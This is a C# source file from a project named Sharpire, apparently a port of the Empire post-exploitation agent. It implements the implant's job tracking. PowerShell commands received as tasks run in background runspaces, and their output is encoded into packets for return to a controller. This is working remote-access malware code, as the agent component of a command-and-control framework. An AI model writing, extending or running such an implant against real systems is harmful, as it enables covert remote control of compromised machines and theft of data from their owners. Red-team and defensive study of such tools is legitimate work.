using System;
using System.Collections.Generic;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading;

namespace Sharpire
{
    public class JobTracking
    {
        public Dictionary<string, Job> jobs;
        public Dictionary<string, ushort> jobsId;

        public JobTracking()
        {
            jobs = new Dictionary<string, Job>();
            jobsId = new Dictionary<string, ushort>();
        }

        internal void CheckAgentJobs(ref byte[] packets, ref Coms coms)
        {
            lock (jobs)
            {
                List<string> jobsToRemove = new List<string>();
                foreach (KeyValuePair<string, Job> job in jobs)
                {
                    string results = job.Value.GetOutput();
                    if (!string.IsNullOrEmpty(results))
                    {
                        packets = Misc.combine(packets, coms.EncodePacket(110, results, jobsId[job.Key]));
                    }

                    if (job.Value.IsCompleted())
                    {
                        job.Value.KillThread();
                        job.Value.Status = "stopped";
                        jobsToRemove.Add(job.Key);
                    }
                }
                jobsToRemove.ForEach(x => jobs.Remove(x));
                lock (jobsId)
                {
                    jobsToRemove.ForEach(x => jobsId.Remove(x));
                }
            }
        }

        internal byte[] GetAgentJobsOutput(ref Coms coms)
        {
            byte[] jobResults = new byte[0];
            lock (jobs)
            {
                List<string> jobsToRemove = new List<string>();
                foreach (string jobName in jobs.Keys)
                {
                    string results = jobs[jobName].GetOutput();
                    if (!string.IsNullOrEmpty(results))
                    {
                        jobResults = Misc.combine(jobResults, coms.EncodePacket(110, results, jobsId[jobName]));
                    }

                    if (jobs[jobName].IsCompleted())
                    {
                        jobs[jobName].KillThread();
                        jobs[jobName].Status = "stopped";
                        jobsToRemove.Add(jobName);
                    }
                }
                jobsToRemove.ForEach(x => jobs.Remove(x));
                lock (jobsId)
                {
                    jobsToRemove.ForEach(x => jobsId.Remove(x));
                }
            }
            return jobResults;
        }

        internal void StartAgentJob(string command, ushort taskId)
        {
            string taskIdString = taskId.ToString();
            lock (jobs)
            {
                if (jobs.ContainsKey(taskIdString))
                {
                    jobs[taskIdString].UpdateCommand(command);
                }
                else
                {
                    jobs.Add(taskIdString, new Job(command));
                }
            }
            lock (jobsId)
            {
                if (!jobsId.ContainsKey(taskIdString))
                {
                    jobsId.Add(taskIdString, taskId);
                }
            }
        }

        public class Job
        {
            private Thread JobThread { get; set; }
            private Queue<string> outputQueue = new Queue<string>();
            private bool isFinished = false;
            public string Status { get; set; }
            public string Language { get; set; }
            public Thread Thread { get; set; }
            public PowershellDetails Powershell { get; set; }
            private readonly object syncLock = new object();
            private string command;

            public Job()
            {
                // Default constructor for initialization
            }

            public Job(string command)
            {
                Status = "running";
                this.command = command;
                StartJob();
            }

            private void StartJob()
            {
                JobThread = new Thread(RunPowerShell);
                JobThread.Start();
            }

            public void UpdateCommand(string newCommand)
            {
                lock (syncLock)
                {
                    command = newCommand;

                    if (JobThread != null && JobThread.IsAlive)
                    {
                        JobThread.Abort();
                    }
                    StartJob();
                }
            }

            public void RunPowerShell()
            {
                using (Runspace runspace = RunspaceFactory.CreateRunspace())
                {
                    runspace.Open();

                    using (PowerShell psInstance = PowerShell.Create())
                    {
                        psInstance.Runspace = runspace;
                        psInstance.AddScript(command);

                        PSDataCollection<PSObject> outputCollection = new PSDataCollection<PSObject>();
                        outputCollection.DataAdded += (sender, e) =>
                        {
                            lock (syncLock)
                            {
                                while (outputCollection.Count > 0)
                                {
                                    PSObject data = outputCollection[0];
                                    if (data != null)
                                    {
                                        outputQueue.Enqueue(data.ToString());
                                    }
                                    outputCollection.RemoveAt(0);
                                }
                            }
                        };

                        try
                        {
                            IAsyncResult result = psInstance.BeginInvoke<PSObject, PSObject>(null, outputCollection);

                            while (!result.IsCompleted || outputCollection.Count > 0)
                            {
                                Thread.Sleep(200);
                            }
                        }
                        catch (Exception error)
                        {
                            lock (syncLock)
                            {
                                string errorMessage = "[-] Error: " + error.Message;
                                outputQueue.Enqueue(errorMessage);
                            }
                        }
                        finally
                        {
                            lock (syncLock)
                            {
                                isFinished = true;
                            }
                        }
                    }
                }
            }


            public bool IsCompleted()
            {
                lock (syncLock)
                {
                    if (JobThread != null && JobThread.IsAlive)
                    {
                        if (isFinished && outputQueue.Count == 0)
                        {
                            Status = "completed";
                            return true;
                        }
                        return false;
                    }
                    else
                    {
                        Status = "completed";
                        return true;
                    }
                }
            }

            public string GetOutput()
            {
                lock (syncLock)
                {
                    StringBuilder sb = new StringBuilder();
                    while (outputQueue.Count > 0)
                    {
                        sb.AppendLine(outputQueue.Dequeue());
                    }
                    string result = sb.ToString();

                    outputQueue.Clear();
                    return result;
                }
            }

            public void KillThread()
            {
                if (JobThread != null)
                {
                    JobThread.Abort();
                    Status = "stopped";
                }
            }
        }
        public class PowershellDetails
        {
            public object AppDomain { get; set; }
            public object PsHost { get; set; }
            public object Buffer { get; set; }
            public object PsHostExec { get; set; }
        }
    }
}